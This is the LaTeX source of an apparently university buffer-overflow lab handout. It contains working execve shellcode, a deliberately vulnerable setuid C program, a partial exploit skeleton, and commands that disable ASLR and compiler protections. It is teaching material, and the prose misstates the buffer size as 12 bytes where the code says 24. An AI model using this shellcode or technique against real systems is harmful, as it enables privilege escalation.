\documentclass[11pt]{article}

\usepackage{times}
\usepackage{epsf}
\usepackage{epsfig}
\usepackage{amsmath, alltt, amssymb, xspace}
\usepackage{wrapfig}
\usepackage{fancyhdr}
\usepackage{url}
\usepackage{verbatim}
\usepackage{fancyvrb}

\usepackage{subfigure}
\usepackage{cite}
%\usepackage{cases}
%\usepackage{ltexpprt}
%\usepackage{verbatim}

%\topmargin      -0.70in  % distance to headers
%\headheight     0.2in   % height of header box
%\headsep        0.4in   % distance to top line
%\footskip       0.3in   % distance from bottom line

% Horizontal alignment
\topmargin      -0.50in  % distance to headers
\oddsidemargin  0.0in
\evensidemargin 0.0in
\textwidth      6.5in
\textheight     8.9in 


%\centerfigcaptionstrue

%\def\baselinestretch{0.95}


\newcommand\discuss[1]{\{\textbf{Discuss:} \textit{#1}\}}
%\newcommand\todo[1]{\vspace{0.1in}\{\textbf{Todo:} \textit{#1}\}\vspace{0.1in}}
\newtheorem{problem}{Problem}[section]
%\newtheorem{theorem}{Theorem}
%\newtheorem{fact}{Fact}
\newtheorem{define}{Definition}[section]
%\newtheorem{analysis}{Analysis}
\newcommand\vspacenoindent{\vspace{0.1in} \noindent}

%\newenvironment{proof}{\noindent {\bf Proof}.}{\hspace*{\fill}~\mbox{\rule[0pt]{1.3ex}{1.3ex}}}
%\newcommand\todo[1]{\vspace{0.1in}\{\textbf{Todo:} \textit{#1}\}\vspace{0.1in}}

%\newcommand\reducespace{\vspace{-0.1in}}
% reduce the space between lines
%\def\baselinestretch{0.95}

\newcommand{\fixmefn}[1]{ \footnote{\sf\ \ \fbox{FIXME} #1} }
\newcommand{\todo}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{TODO: #1}}
\vspace{0.1in}
}

\newcommand{\mybox}[1]{
\vspace{0.2in}
\noindent
\fbox{\parbox{6.5in}{#1}}
\vspace{0.1in}
}


\newcounter{question}
\setcounter{question}{1}

\newcommand{\myquestion} {{\vspace{0.1in} \noindent \bf Question \arabic{question}:} \addtocounter{question}{1} \,}

\newcommand{\myproblem} {{\noindent \bf Problem \arabic{question}:} \addtocounter{question}{1} \,}


\newcommand{\copyrightnoticeA}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{\small Copyright \copyright\ 2006 - 2014\ \ Wenliang Du, Syracuse University.\\ 
      The development of this document is partially funded by 
      the National Science Foundation's Course, Curriculum, and Laboratory 
      Improvement (CCLI) program under Award No. 0618680 and 0231122. 
      Permission is granted to copy, distribute and/or modify this document
      under the terms of the GNU Free Documentation License, Version 1.2
      or any later version published by the Free Software Foundation.
      A copy of the license can be found at http://www.gnu.org/licenses/fdl.html.}}
\vspace{0.1in}
}


\newcommand{\copyrightnotice}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{\small Copyright \copyright\ 2006 - 2014\ \ Wenliang Du, Syracuse University.\\
      The development of this document is/was funded by three grants from
      the US National Science Foundation: Awards No. 0231122 and 0618680 from
      TUES/CCLI and  Award No. 1017771 from Trustworthy Computing.
      This lab was imported into the Labtainer framework by the Naval Postgraduate 
      School, Center for Cybersecurity and Cyber Operations under National Science 
      Foundation Award No. 1438893.
      Permission is granted to copy, distribute and/or modify this document
      under the terms of the GNU Free Documentation License, Version 1.2
      or any later version published by the Free Software Foundation.
      A copy of the license can be found at http://www.gnu.org/licenses/fdl.html.}}
\vspace{0.1in}
}

\newcommand{\copyrightnoticeB}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{\small Copyright \copyright\ 2006 - 2014\ \ Wenliang Du, Syracuse University.\\
      The development of this document is/was funded by the following grants from
      the US National Science Foundation: No. 0231122, 0618680, and 1303306.
      Permission is granted to copy, distribute and/or modify this document
      under the terms of the GNU Free Documentation License, Version 1.2
      or any later version published by the Free Software Foundation.
      A copy of the license can be found at http://www.gnu.org/licenses/fdl.html.}}
\vspace{0.1in}
}


\newcommand{\nocopyrightnotice}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{\small  
      The development of this document is funded by 
      the National Science Foundation's Course, Curriculum, and Laboratory 
      Improvement (CCLI) program under Award No. 0618680 and 0231122. 
      Permission is granted to copy, distribute and/or modify this document.
      }}
\vspace{0.1in}
}

\newcommand{\idea}[1]{
\vspace{0.1in}
{\sf IDEA:\ \ \fbox{\parbox{5in}{#1}}}
\vspace{0.1in}
}

\newcommand{\questionblock}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{#1}}
\vspace{0.1in}
}


\newcommand{\minix}{{\tt Minix}\xspace}
\newcommand{\unix}{{\tt Unix}\xspace}
\newcommand{\linux}{{\tt Linux}\xspace}
\newcommand{\ubuntu}{{\tt Ubuntu}\xspace}
\newcommand{\selinux}{{\tt SELinux}\xspace}
\newcommand{\freebsd}{{\tt FreeBSD}\xspace}
\newcommand{\solaris}{{\tt Solaris}\xspace}
\newcommand{\windowsnt}{{\tt Windows NT}\xspace}
\newcommand{\setuid}{{\tt Set-UID}\xspace}
%\newcommand{\smx}{{\tt Smx}\xspace}
\newcommand{\smx}{{\tt Minix}\xspace}
\newcommand{\relay}{{\tt relay}\xspace}
\newcommand{\isys}{{\tt iSYS}\xspace}
\newcommand{\ilan}{{\tt iLAN}\xspace}
\newcommand{\iSYS}{{\tt iSYS}\xspace}
\newcommand{\iLAN}{{\tt iLAN}\xspace}
\newcommand{\iLANs}{{\tt iLAN}s\xspace}
\newcommand{\bochs}{{\tt Bochs}\xspace}

\newcommand\FF{{\mathcal{F}}}

\newcommand{\argmax}[1]{
\begin{minipage}[t]{1.25cm}\parskip-1ex\begin{center}
argmax
#1
\end{center}\end{minipage}
\;
}

\newcommand{\bm}{\boldmath}
\newcommand  {\bx}    {\mbox{\boldmath $x$}}
\newcommand  {\by}    {\mbox{\boldmath $y$}}
\newcommand  {\br}    {\mbox{\boldmath $r$}}


%\pagestyle{fancyplain}
%\lhead[\thepage]{\thesection}      % Note the different brackets!
%\rhead[\thesection]{SEED Laboratories}
%\lfoot[\fancyplain{}{}]{Syracuse University} 
%\cfoot[\fancyplain{}{}]{\thepage} 

\newcommand{\tstamp}{\today}   
%\lhead[\fancyplain{}{\thepage}]         {\fancyplain{}{\rightmark}}
%\chead[\fancyplain{}{}]                 {\fancyplain{}{}}
%\rhead[\fancyplain{}{\rightmark}]       {\fancyplain{}{\thepage}}
%\lfoot[\fancyplain{}{}]                 {\fancyplain{\tstamp}{\tstamp}}
%\cfoot[\fancyplain{\thepage}{}]         {\fancyplain{\thepage}{}}
%\rfoot[\fancyplain{\tstamp} {\tstamp}]  {\fancyplain{}{}}

\pagestyle{fancy}
%\lhead{\bfseries Computer Security Course Project}
\lhead{\bfseries SEED Labs}
\chead{}
\rhead{\small \thepage}
\lfoot{}
\cfoot{}
\rfoot{}

\usepackage{listings}
\usepackage{color}

\definecolor{dkgreen}{rgb}{0,0.6,0}
\definecolor{gray}{rgb}{0.5,0.5,0.5}
\definecolor{mauve}{rgb}{0.58,0,0.82}

\lstset{frame=tb,
  language=C,
  aboveskip=3mm,
  belowskip=3mm,
  showstringspaces=false,
  columns=flexible,
  basicstyle={\small\ttfamily},
  numbers=none,
  numberstyle=\tiny\color{gray},
  keywordstyle=\color{blue},
  commentstyle=\color{dkgreen},
  stringstyle=\color{mauve},
  breaklines=true,
  breakatwhitespace=true,
  tabsize=3
}




%\documentclass{article} 
%\usepackage{graphicx}
%\usepackage{color}
%\usepackage[latin1]{inputenc}
%\usepackage{lgrind}
%\input {highlight.sty}


\lhead{\bfseries SEED Labs -- Buffer Overflow Vulnerability Lab}

\def \code#1 {\fbox{\scriptsize{\texttt{#1}}}}

\begin{document}

\begin{center}
{\LARGE Buffer Overflow Vulnerability Lab}
\end{center}

\copyrightnotice

\section{Lab Overview}

The learning objective of this lab is for students to gain the first-hand
experience on buffer-overflow vulnerability by putting what they have learned
about the vulnerability from class into action. 
Buffer overflow is defined as the condition in which a program attempts to
write data beyond the boundaries of pre-allocated fixed length buffers. This
vulnerability can be utilized by a malicious user to alter the flow control of
the program, even execute arbitrary pieces of code. This vulnerability arises
due to the mixing of the storage for data (e.g. buffers) and the 
storage for controls (e.g. return addresses): an overflow in the data part can
affect the control flow of the program, because an overflow can
change the return address.

In this lab, students will be given a program with a buffer-overflow
vulnerability; their task is to develop a scheme to exploit 
the vulnerability and finally gain the root privilege.  In addition to the
attacks, students will be guided to walk through several protection
schemes that have been implemented in the operating system to counter against the
buffer-overflow attacks.  Students need to evaluate 
whether the schemes work or not and explain why.


\section{Lab Tasks}

\subsection{Initial setup}
The lab is started from the Labtainer working 
directory on your Docker-enabled host, e.g., a Linux VM.
From there, issue the command:
\begin{verbatim}
    start.py bufoverflow
\end{verbatim}

The resulting virtual terminals will include a 
bash shell.  The programs
described below will be in your home directory.

\paragraph{Address Space Randomization.}
Several Linux-based systems uses address space
randomization to randomize the starting address of heap and
stack. This makes guessing the exact addresses difficult; guessing
addresses is one of the critical steps of buffer-overflow attacks.  In
this lab, we disable these features using the following commands:

\begin{verbatim}
  sudo sysctl -w kernel.randomize_va_space=0
\end{verbatim}


\paragraph{The StackGuard Protection Scheme.}
The GCC compiler implements a security mechanism called
"Stack Guard" to prevent buffer overflows. In the presence of this
protection, buffer overflow will not work. You can disable this
protection if you compile the program using the 
\emph{-fno-stack-protector} switch. For example, to compile a program
example.c with Stack Guard disabled, you may use the following command:
\begin{verbatim}
  $ gcc -m32 -fno-stack-protector example.c
\end{verbatim}
\noindent Note we use the "-m32" switch to create 32 bit executables, which
are required for this lab.

\paragraph{Non-Executable Stack.} \ubuntu used to allow executable stacks, but
this has now changed: the binary images of programs (and shared libraries) 
must declare whether they require executable stacks or not, i.e., they need to 
mark a field in the program header. Kernel or dynamic linker uses this marking
to decide whether to make the stack of this running program executable or 
non-executable. This marking is done automatically by the 
recent versions of {\tt gcc}, and by default, the stack is set to 
be non-executable.  To change that, use the following option when compiling
programs:
\begin{verbatim}
  For executable stack:
  $ gcc -m32 -z execstack  -o test test.c

  For non-executable stack:
  $ gcc -m32 -z noexecstack  -o test test.c
\end{verbatim}



\subsection{Shellcode}
Before you start the attack, you need a shellcode. A shellcode is the code to
launch a shell. It has to be loaded into the memory so that we can force the
vulnerable program to jump to it. Consider the following program:

\begin{verbatim}
#include <stdio.h>

int main( ) {
   char *name[2];

   name[0] = ``/bin/sh'';
   name[1] = NULL;
   execve(name[0], name, NULL);
}
\end{verbatim}


The shellcode that we use is just the assembly version of the above program.
The following program shows you how to launch a shell by executing 
a shellcode stored in a buffer.
Please compile and run the following code, and see whether a
shell is invoked. 

\begin{verbatim}
/* call_shellcode.c  */

/*A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char code[] =
  "\x31\xc0"         /* Line 1:  xorl    %eax,%eax              */
  "\x50"             /* Line 2:  pushl   %eax                   */
  "\x68""//sh"       /* Line 3:  pushl   $0x68732f2f            */
  "\x68""/bin"       /* Line 4:  pushl   $0x6e69622f            */
  "\x89\xe3"         /* Line 5:  movl    %esp,%ebx              */
  "\x50"             /* Line 6:  pushl   %eax                   */
  "\x53"             /* Line 7:  pushl   %ebx                   */
  "\x89\xe1"         /* Line 8:  movl    %esp,%ecx              */
  "\x99"             /* Line 9:  cdq                            */
  "\xb0\x0b"         /* Line 10: movb    $0x0b,%al              */
  "\xcd\x80"         /* Line 11: int     $0x80                  */
;

int main(int argc, char **argv)
{
   char buf[sizeof(code)];
   strcpy(buf, code);
   ((void(*)( ))buf)( );
} 
\end{verbatim}
\textbf{Note:} In this lab we have relaced the {\tt bin/sh} program
with an older insecure shell that will inherit the setuid permissions
assocated with the {\tt stack} program.  Modern shells will use the
process real uid as their effective id, thereby making it more difficult
to obtain root shells from setuid programs.
However, more sophisticated shell code can run the following program to 
turn the real user id to {\tt root}. This way, you would have a real {\tt root} process.
\begin{verbatim}
  void main()
  { 
    setuid(0);  system("/bin/sh");
  }
\end{verbatim}
\noindent For this lab, we'll use the simpler shell code and and insecure /bin/sh program.

Please use the following command to compile the code (don't forget the 
{\tt execstack} option):

\begin{verbatim}
  $ gcc -m32 -z execstack -o call_shellcode call_shellcode.c
\end{verbatim}


A few places in this shellcode are worth mentioning. First, 
the third instruction pushes ``//sh'', rather than ``/sh'' into the 
stack. This is because we need a 32-bit number here, and ``/sh'' 
has only 24 bits. Fortunately, ``//'' is equivalent to ``/'', so we can get 
away with a double slash symbol. Second, before calling the {\tt execve()}
system call, we need to store {\tt name[0]} (the address of the string), 
{\tt name} (the address of the array), and {\tt NULL} to
the {\tt \%ebx}, {\tt \%ecx}, and {\tt \%edx} registers, respectively. 
Line 5 stores {\tt name[0]} to {\tt \%ebx}; 
Line 8 stores {\tt name} to    {\tt \%ecx}; 
Line 9 sets {\tt \%edx} to zero. There are other ways to set {\tt \%edx}
to zero (e.g., {\tt xorl \%edx, \%edx}); the one ({\tt cdq}) used here
is simply a shorter instruction: it copies the sign (bit 31) of the value in the EAX
register (which is 0 at this point) into every bit position in the EDX
register, basically setting {\tt \%edx} to 0.
Third, the system call {\tt execve()} is called when we set {\tt \%al} to
11, and execute ``{\tt int \$0x80}''.

\subsection{The Vulnerable Program}

\begin{verbatim}
/* stack.c */

/* This program has a buffer overflow vulnerability. */
/* Our task is to exploit this vulnerability */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bof(char *str)
{
    char buffer[24];

    /* The following statement has a buffer overflow problem */ 
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 517, badfile);
    bof(str);
    printf("Returned Properly\n");
    return 1;
}
\end{verbatim}

Compile the above vulnerable program and make it set-root-uid. You
can achieve this by compiling it in the {\tt root} account, and 
{\tt chmod} the executable to {\tt 4755} (don't forget to include the {\tt
execstack} and {\tt -fno-stack-protector} options to turn off
the non-executable stack and StackGuard protections):

\begin{verbatim}
  $ su root 
    Password (enter root password)
  # gcc -m32 -o stack -z execstack -fno-stack-protector stack.c
  # chmod 4755 stack
  # exit  
\end{verbatim}



The above program has a buffer overflow vulnerability. It first 
reads an input from a file called ``badfile'', and then passes this
input to another buffer in the function {\tt bof()}. The 
original input can have a maximum length of 517 bytes, but the buffer
in {\tt bof()} has only 12 bytes long. Because {\tt strcpy()} does not check
boundaries, buffer overflow will occur.
Since this program is a set-root-uid program, if a normal user can exploit
this buffer overflow vulnerability, the normal user might be 
able to get a root shell.
It should be noted that 
the program gets its input from a file called ``badfile''. This file
is under users' control. Now, our objective is to 
create the contents for ``badfile'', such that when the vulnerable program
copies the contents into its buffer, a root shell can be spawned.



\subsection{Task 1: Exploiting the Vulnerability} 

We provide you with a partially completed exploit code called 
``exploit.c''. The goal of this code is to construct contents 
for ``badfile''. In this code, the shellcode is given to you. 
You need to develop the rest. 


\begin{verbatim}
/* exploit.c  */

/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

void main(int argc, char **argv)
{
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(&buffer, 0x90, 517);

    /* You need to fill the buffer with appropriate contents here */ 

    /* Save the contents to the file "badfile" */
    badfile = fopen("./badfile", "w");
    fwrite(buffer, 517, 1, badfile);
    fclose(badfile);
}

\end{verbatim}

After you finish the above program, compile and run it. This will generate
the contents for ``badfile''. Then run the vulnerable 
program {\tt stack}. If your exploit is implemented correctly, you should 
be able to get a root shell:  

\paragraph{Important:} Please compile your vulnerable program
first. Please note that the program exploit.c, which generates the bad
file, can be compiled with the default Stack Guard protection
enabled. This is because we are not going to overflow the buffer in
this program. We will be overflowing the buffer in stack.c, which is
compiled with the Stack Guard protection disabled.

\begin{verbatim}
  $ gcc -o exploit exploit.c
  $./exploit        // create the badfile
  $./stack          // launch the attack by running the vulnerable program
  # <---- Bingo! You've got a root shell! 
\end{verbatim}
While in the root shell, you are required to display the content of a secret file:
\begin{verbatim}
  cat /root/.secret
\end{verbatim}

It should be noted that although you have obtained the ``\#'' prompt, 
your real user id is still yourself (the effective user id is now
root). You can check this by typing the following:
\begin{verbatim}
  # id
  uid=(500) euid=0(root)
\end{verbatim}




\subsection{Task 2: Address Randomization}

Now, we turn on the Ubuntu's address randomization.  We run the same attack
developed in Task 1. Can you get a shell? If not, what is the problem?
How does the address randomization make your attacks difficult?
You should describe your observation and explanation
in your lab report. You can use the following instructions to turn
on the address randomization:

\begin{verbatim}
  sudo /sbin/sysctl -w kernel.randomize_va_space=2
\end{verbatim}


If running the vulnerable code once does not get you the root shell, how 
about running it for many times? You can run {\tt ./stack} 
using the whilebash.sh script, and see what will happen. If your exploit
program is designed properly, you should be able to get the root shell
after a while. You can modify your exploit program to increase the
probability of success (i.e., reduce the time that you have to wait).

\subsection{Task 3: Stack Guard}

Before working on this task, remember to turn off the address
randomization first, or you will not know which protection helps 
achieve the protection.

In our previous tasks, we disabled the ``Stack Guard'' protection mechanism in GCC
when compiling the programs. In this task, you may consider repeating
task 1 in the presence of Stack Guard. To do that, you should compile
the program without the \emph{-fno-stack-protector'} option. For this
task, you will recompile the vulnerable program, stack.c, to use GCC's
Stack Guard, execute task 1 again, and report your observations. You
may report any error messages you observe.

In the GCC 4.3.3 and newer versions, Stack Guard is enabled by
default. Therefore, you have to disable Stack Guard using the switch
mentioned before. In earlier versions, it was disabled by default. If
you use a older GCC version, you may not have to disable Stack Guard. 

\subsection{Task 4: Non-executable Stack}

Before working on this task, remember to turn off the address
randomization first, or you will not know which protection helps 
achieve the protection.

In our previous tasks, we intentionally make stacks executable.
In this task, we recompile our vulnerable program 
using the {\tt noexecstack} option, and repeat the attack in
Task 1. Can you get a shell? If not, what is the problem? How does
this protection scheme make your attacks difficult. 
You should describe your observation and explanation
in your lab report. You can use the following instructions to turn
on the non-executable stack protection.

\begin{verbatim}
  # gcc -m32 -o stack -fno-stack-protector -z noexecstack stack.c
\end{verbatim}


It should be noted that non-executable stack only makes it impossible to run shellcode 
on the stack, but it does not prevent buffer-overflow attacks, 
because there are other ways to run malicious code after exploiting 
a buffer-overflow vulnerability. The {\em return-to-libc} attack
is an example. We have designed a seperate lab for that 
attack. If you are interested, please see the 
Return-to-Libc Attack Lab for details.



\section{Guidelines}

We can load the shellcode into ``badfile'', but it will not be executed because our
instruction pointer will not be pointing to it. One thing we can do is to change
the return address to point to the shellcode. But we have two problems:
(1) we do not know where the return address is stored, and
(2) we do not know where the shellcode is stored.
To answer these questions, we need to understand the stack layout the 
execution enters a function. The following figure gives 
an example.


\hspace{-0.5in}
\includegraphics*[viewport=40 480 595 700,width=6.5in,natwidth=621,natheight=403]{Figs/buffer_overflow_stack_example1.pdf}


\paragraph{Finding the address of the memory that stores the return address.}
From the figure, we know, if we can find out the address of {\tt buffer[]} array, 
we can calculate where the return address is stored. 
Since the vulnerable program is a \setuid program, you can make a copy of this program,
and run it with your own privilege; this way you can debug the program (note that
you cannot debug a \setuid program). In the debugger, you can figure out
the address of {\tt buffer[]}, and thus calculate the starting point of
the malicious code. You can even modify the copied program, and ask the 
program to directly print out the address of {\tt buffer[]}.
The address of {\tt buffer[]} may be slightly
different when you run the \setuid copy, instead of of your copy, but
you should be quite close. 


If the target program is running remotely, and you may not be able to
rely on the debugger to find out the address. However, you can always
{\em guess}. The following facts make guessing a quite feasible approach:
      \begin{itemize}
      \item Stack usually starts at the same address.
      \item Stack is usually not very deep: most programs do not push more than
            a few hundred or a few thousand bytes into the stack at any one time.
      \item Therefore the range of addresses that we need to guess is actually
            quite small.
      \end{itemize}



\paragraph{Finding the starting point of the malicious code.}
If you can accurately calculate the address of {\tt buffer[]}, you should be 
able to accurately calcuate the starting point of the malicious code.
Even if you cannot accurately calculate the address (for example, for remote programs),
you can still guess. To improve the chance of success, we can add a
number of NOPs to the beginning of the malcious code; therefore, if we 
can jump to any of these NOPs, we can eventually get to the 
malicious code. The following figure depicts the attack.


\begin{center}
\includegraphics*[viewport=0.25in 5.2in 8.30in 10.55in,width=4.0in,natwidth=621,natheight=403]{Figs/buffer_overflow_jump_to_malicious_code.pdf}
\end{center}


\paragraph{Storing an long integer in a buffer:} 
In your exploit program, you might need to store an {\tt long} 
integer (4 bytes) into an buffer starting at buffer[i]. 
Since each buffer space is one byte long,
the integer will actually occupy four bytes starting at buffer[i] (i.e.,
buffer[i] to buffer[i+3]). Because buffer and long are of different
types, you cannot directly assign the integer to buffer; instead you can 
cast the buffer+i into an {\tt long} pointer, and then assign the integer. The
following code shows how to assign an {\tt long} integer to a buffer
starting at buffer[i]:
\begin{verbatim}
   char buffer[20];
   long addr = 0xFFEEDD88;

   long *ptr = (long *) (buffer + i);
   *ptr = addr;
\end{verbatim}

\begin{thebibliography}{10}

\bibitem{alephone}
Aleph One.
\newblock Smashing The Stack For Fun And Profit.
\newblock {\em Phrack 49}, Volume 7, Issue 49. Available at
         http://www.cs.wright.edu/people/faculty/tkprasad/courses/cs781/alephOne.html
\end{thebibliography}


\end{document}
